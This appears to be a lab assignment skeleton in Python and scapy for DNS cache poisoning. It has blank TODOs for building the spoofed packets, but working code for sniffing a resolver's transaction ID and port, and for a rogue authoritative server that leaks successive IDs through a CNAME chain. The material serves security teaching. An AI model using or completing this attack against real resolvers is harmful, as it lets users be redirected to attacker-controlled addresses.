from rng_solver import *
from scapy.all import *

# ip configurations
target_dns = "10.9.0.53"
root_dns = "10.9.1.153"
example_auth_dns = "10.9.0.154"
attacker_auth_dns = "10.9.0.155"

attacker_ip = "10.9.0.10"
victim_ip = "10.9.0.20"
fake_ip = "6.6.6.6"
#Globals
INCR=0
TXIDS = []

def build_spoofed_dns_request(from_ip, from_port, to_port, qname, qtype):
    #TODO: build a DNS request packet with the specified parameters, using scapy

    #END TODO
    return malicious_pkt

def build_spoofed_dns_response(txid, target_port,  response_ip, qname="www.example.com.", qtype='A'):
    #TODO: build a DNS response packet with the specified parameters, using scapy

    #END TODO
    return spoofed_pkt

def sniff_port_and_txid(max_attempts):
    global INCR
    
    for attempt in range(1, max_attempts + 1):
        print("[*] Leak attempt {}/{}...".format(attempt, max_attempts))
        sniffer = AsyncSniffer(
            iface="eth0",
            count=1,
            timeout=5,
            lfilter=lambda p: (
                p.haslayer(IP)
                and p.haslayer(UDP)
                and p.haslayer(DNS)
                and p[DNS].qr == 0
                and p[IP].src == target_dns
                and p[IP].dst == attacker_ip
                and p[UDP].dport == 53
            ),
        )
        sniffer.start()
        time.sleep(0.06)
        INCR+=1
        #TODO: How should we trigger the dns resolver to send a request to the AsyncSniffer?
        
        #END TODO
        sniffer.join()
        if sniffer.results and len(sniffer.results) > 0:
            leaked_txid = sniffer.results[0][DNS].id
            target_port = sniffer.results[0][UDP].sport
            print("[+] Leaked TXID: {}, Port: {}".format(leaked_txid, target_port))
            return leaked_txid, target_port

    print("[-] Could not leak TXID/port from local-dns to attacker.")
    exit(1)

def parse_index(qname: str) -> int:
    try:
        return int(qname.strip('.').split('.')[0])
    except ValueError:
        return -1

def run_auth_server(host="0.0.0.0", port=53, count=17):
    """this function runs a simple authoritative DNS server that responds to queries for <index>.leak.attacker.com with a CNAME to <index+1>.leak.attacker.com,
    and finally returns an A record with the attacker's IP.
    This allows us to leak multiple subsequent TXIDs by causing the resolver to follow the CNAME chain."""
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind((host, port))
    print("Auth server listening on {}:{}".format(host, port))

    while len(TXIDS) < count:
        data, addr = sock.recvfrom(512)

        try:
            dns_query = DNS(data)
            if dns_query.qr != 0 or dns_query.qd is None:
                continue
            txid  = dns_query.id
            qname = dns_query.qd.qname.decode()
        except Exception as e:
            print("[!] Bad packet from {}: {}".format(addr, e))
            continue

        index = parse_index(qname)
        if index < 0:
            print("[?] Cannot parse index from {}, ignoring".format(qname))
            continue

        TXIDS.append(txid)
        print("[+] TXID {:5d} (0x{:04X}) | hop {:02d} | from {} | qname: {}".format(
            txid, txid, len(TXIDS)-1, addr[0], qname))

        next_name = "{}.leak.attacker.com.".format(index + 1)

        if len(TXIDS) >= count:
            # Last hop: send a real A record to terminate cleanly
            pkt = DNS(
                id=txid, qr=1, aa=1, rd=0, ra=0,
                qd=dns_query.qd,
                an=DNSRR(rrname=qname, type="A", rclass="IN", ttl=0, rdata=attacker_ip),
            )
        else:
            # CNAME in ANSWER section: BIND follows it without referral-loop detection
            pkt = DNS(
                id=txid, qr=1, aa=1, rd=0, ra=0,
                qd=dns_query.qd,
                an=DNSRR(
                    rrname=qname,
                    type="CNAME",
                    rclass="IN",
                    ttl=0,
                    rdata=next_name,   # "1.leak.attacker.com.", "2..." etc.
                ),
            )

        sock.sendto(raw(pkt), addr)

